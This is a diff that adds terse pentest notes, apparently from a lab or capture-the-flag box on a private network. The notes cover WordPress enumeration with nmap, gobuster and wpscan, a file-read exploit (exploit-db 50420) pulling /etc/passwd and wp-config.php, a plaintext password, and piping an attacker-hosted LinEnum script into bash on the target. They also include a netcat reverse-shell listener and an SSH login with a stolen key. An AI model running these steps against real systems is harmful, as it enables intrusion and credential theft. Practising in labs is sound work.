@@ -1,0 +1,68 @@
+192.168.1.162 my ip
+ziel : 192.168.1.205
+kali
+http://192.168.1.205/S3cr3t/
+
+user1 : alpha	  // pass:  Alpha_P@ssw0rd!
+user2 : wp_user
+–plugins-detection aggressive
+https://www.exploit-db.com/exploits/50420
+
+https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
+
+
+https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
+
+git clone https://github.com/rebootuser/LinEnum/     >>>> downlowad
+
+sudo python -m http.server 80 #host
+
+
+curl 192.168.1.162/LinEnu.sh | bash
+
+python -c "import pty; pty.spawn('/bin/bash')"
+
+ssh -i /home/alpha/.ssh/id_rsa alpha@192.168.1.205
+
+
+
+https://www.revshells.com/
+
+https://www.exploit-db.com/exploits/50420
+
+
+
+
+history 
+
+1  ping 8.8.8.8
+    2  ifconfig
+    3  sudo python -m http.server 80 #host
+    
+    4  git clone https://github.com/rebootuser/LinEnum/
+    
+    5  ls -l
+    
+    6  rlwrap -cAr nc -lvnp 5555\n
+    
+    7  ls -l
+    8  cd Downloads
+    
+    9  python 50420.py http://192.168.1.205 /etc/passwd
+   10
+   11  python 50420.py http://192.168.1.205 wp-config.php
+   
+   12  python 50420.py http://192.168.1.205 /etc/passwd
+   13  cat wp-config.php
+   14  rlwrap -cAr nc -lvnp 5555
+   15  nmap 192.168.1.0/24
+   16  nmap -sCV 192.168.1.205
+   
+   17  
+   18  
+   19  gobuster dir -u 192.168.1.205 -w /usr/share/wordlists/dirb/common.txt
+   
+   20  gobuster dir -u 192.168.1.205/S3cr3t -w /usr/share/wordlists/dirb/common.txt
+   
+   2
+   22  wpscan --url http://192.168.1.205/S3cr3t --plugins-detection aggressive
